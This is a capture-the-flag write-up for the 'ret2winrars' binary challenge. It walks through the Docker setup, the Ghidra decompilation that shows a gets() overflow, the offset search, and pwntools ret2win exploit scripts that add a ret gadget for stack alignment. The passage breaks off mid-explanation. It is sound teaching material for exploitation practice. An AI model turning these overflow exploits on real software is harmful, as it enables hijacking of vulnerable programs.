here at the winrars we make bad puns 24/ 7
```



## Exploring

We are given the files for a docker environment, the binary and a fake flag file:

```
RET2WINRARS
    build.sh
    ctf.xinetd
    Dockerfile
    flag.txt
    ret2winrars
    start.sh
```

First we check out the Dockerfile, before moving on to some basic reversing:

```dockerfile
# ret2winrars
FROM ubuntu:20.04

RUN apt-get update && apt-get install -y \
  xinetd \
  && rm -rf /var/lib/apt/lists/*

RUN mkdir -p /challenge
RUN useradd -M -d /challenge ctf
WORKDIR /challenge

COPY ctf.xinetd /etc/xinetd.d/ctf
COPY . /challenge/

RUN chown -R ctf:ctf /challenge && chmod -R 770 /challenge
RUN chown -R root:ctf /challenge && \
  chmod -R 750 /challenge

CMD ["/usr/sbin/xinetd", "-dontfork"]

EXPOSE 1337

```

Great, looks everything stands on the `xinetd` service:

```
service ctf
{
    disable = no
    socket_type = stream
    protocol    = tcp
    wait        = no
    user        = ctf
    type        = UNLISTED
    port        = 1337
    bind        = 0.0.0.0
    server      = /bin/sh
    server_args = /challenge/start.sh
    # safety options
    per_source  = 25 # the maximum instances of this service per source IP address
    rlimit_cpu  = 25 # the maximum number of CPU seconds that the service may use
    #rlimit_as  = 1024M # the Address Space resource limit for the service
}
```

And this uses `start.sh`, and will run on port `1337`:

```bash
#/bin/bash
cd challenge/
timeout 30 ./ret2winrar
```

There we go. This is the base of our challenge, and it is very important for this instance to use the docker environment. I will showcase this later. 

### Ghidra

Now it is time to put the binary file into Ghidra:



![](./functions.png)



Three functions are of interest to us: `flag`, `get_license` and of course `main`. Let's check them out one-by-one:

```C
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("Hello, welcome to the WinRaRs!");
  printf("Please enter your WinRaR license key to get access: ");
  get_license();
  puts("Thanks for the license :)");
  return 0;
}
```

Fantastic, nothing complicated, just setting the virtual buffer settings, printing and calling `get_license`. Time to have a look at that function!

```c
void get_license(void)

{
  char local_28 [32];
  
  gets(local_28);
  return;
}
```

Ah a classic. We have a limited buffer in `local_28`, but input is read until a newline character using the `gets` function. This means that more than 32 characters could be read into the array, resulting in buffer overflow! This allows us to overwrite values on the [stack](https://en.wikipedia.org/wiki/Stack_(abstract_data_type)), and potentially alter execution flow. 

All that is left is to check the `flag` function:

```c
void flag(void)

{
  system("/bin/cat flag.txt");
  return;
}
```

Great, this function does the work for us. By calling the `system` function we access the underlying shell commands and get the flag! Great, time to see how we find the overflow. 



## Searching for overflow

I usually do this the most leet way possible... by passing as many `A's` as I feel like using python. And since the `A` character can be represented as 0x41 in hex I can see when we may change code execution, by checking the `dmesg` output. 

```
./ret2winrars 
Hello, welcome to the WinRaRs!
Please enter your WinRaR license key to get access: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

That was 40 `A's`, and no segmentation fault. So we have to try more and more!

```
./ret2winrars 
Hello, welcome to the WinRaRs!
Please enter your WinRaR license key to get access: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

Increasing to 50 `A's` does the trick, time to consult the `dmesg` output (I use `dmesg | tail -n 5`):

```
[ 6200.617483] ret2winrars[18385]: segfault at 4141414141 ip 0000004141414141 sp 00007ffd5d06d4f0 error 14 in libc-2.31.so[7f3988134000+25000]
[ 6200.617497] Code: Unable to access opcode bytes at RIP 0x4141414117.
```

So this tells us a few things:

- 41 is our A character
- `ip` is the instruction pointer, which is at the address where code execution should continue (for 64 bit architectures this is the `rip` register, and for 32 bit it is `eip`)
- We overwrote the whole address, time to find where the address is exactly 0

```
./ret2winrars 
Hello, welcome to the WinRaRs!
Please enter your WinRaR license key to get access: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
Segmentation fault
```

This is input of 40 A's and a single B (0x42), when consulting dmesg we can see the following:

```
[ 6324.281990] ret2winrars[18397]: segfault at 400042 ip 0000000000400042 sp 00007ffe25fd0e90 error 15 in ret2winrars[400000+1000]
[ 6324.281999] Code: 80 10 40 00 00 00 00 00 40 00 00 00 00 00 00 00 18 3a 00 00 00 00 00 00 00 00 00 00 40 00 38 00 0b 00 40 00 1d 00 1c 00 06 00 <00> 00 04 00 00 00 40 00 00 00 00 00 00 00 40 00 40 00 00 00 00 00
```

Focusing on the first line, not even a single 41 appears in the instruction pointer, meaning this is potentially our offset! Time to write our exploit script.

## Exploitation

To solve pwn challenges, [pwntools](https://docs.pwntools.com/en/stable/) is a great tool for pythonistas (and others). I use the following boilerplate for binary challenges:

```python
#!/usr/bin/env python3

from pwn import *

local = True

if local:
	elf = ELF('<binary>')
	p = elf.process()
else:
	p = remote('<address>', port)

junk = b'A'*0xdeadbeef

payload = [
	
	
]


b''.join(payload)

print( p.recvuntil('> ').decode(encoding='ascii') )

p.sendline(payload)
print(payload)

print( p.recvall().decode(encoding='ascii') )
```

Saves me some hassle, might do the same for you. And this is what my script looked like:

```python
#!/usr/bin/env python3

from pwn import *

local = True

elf = ELF('./ret2winrars')

if local:
	p = elf.process()
else:
	p = remote('193.57.159.27', 30527)

junk = b'A'*40

flag = elf.symbols['flag']

payload = [
	junk,
	p64(flag)
]

payload = b''.join(payload)

print( p.recvuntil(': ').decode(encoding='ascii') )

p.sendline(payload)
print(payload)

print(len(p64(flag)))

print( p.recvall().decode(encoding='ascii') )

```

Great, using this script we can exploit the local binary. Accessing `symbols` of the `ELF` object we can find the address of the `flag` function, then using the `p64` function we convert to a valid 64 bit address. Combining that with our 40 `A's` we can overwrite the instruction pointer with the `flag` function address, thus altering code flow and gaining the flag!

Great, just change the `local` variable to False and we have the flag!

Wow... no flag? How come?? Well this where having the same environment as the remote binary comes in handy. Time to use docker! 

### Docker testing

Simply use the `build.sh` script and we should be good to go:

```
docker ps
CONTAINER ID   IMAGE                           COMMAND                  CREATED          STATUS          PORTS                    NAMES
7fec0fb6a583   ret2winrars                     "/usr/sbin/xinetd -dâ€¦"   18 seconds ago   Up 17 seconds   0.0.0.0:1337->1337/tcp   ret2winrars
```

After running `./build.sh` we can see that the container is up, time to test it there and connect a shell with `docker exec -it ret2winrars bash` so we can see the try it locally. 

```
/ret2winrars 
Hello, welcome to the WinRaRs!
Please enter your WinRaR license key to get access: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb\x11@\x00\x00\x00\x00\x00
Segmentation fault (core dumped)
```

Hmm... maybe this is an Ubuntu thing? After doing some research I stumbled across [this](https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call#60795264) thread on SO. It is a stack alignment issue, what we must do is include a `ret` instruction in our payload. 

We do that like this:

```python
#!/usr/bin/env python3

from pwn import *

local = False

elf = ELF('./ret2winrars')
rop = ROP(elf)

if local:
	p = elf.process()
else:
	#p = remote('193.57.159.27', 30527)
	p = remote('127.0.0.1', 1337)

junk = b'A'*40

flag = elf.symbols['flag']
ret = (rop.find_gadget(['ret']))[0]


payload = [
	junk,
	p64(ret),
	p64(flag)
]


payload = b''.join(payload)

print( p.recvuntil(': ').decode(encoding='ascii') )

p.sendline(payload)
print(payload)

print(len(p64(flag)))

print( p.recvall().decode(encoding='ascii') )
```

 Using the `ROP` object, we can access all gadgets (useful instructions) in the binary. Allowing us to search for a `ret` instruction:

```
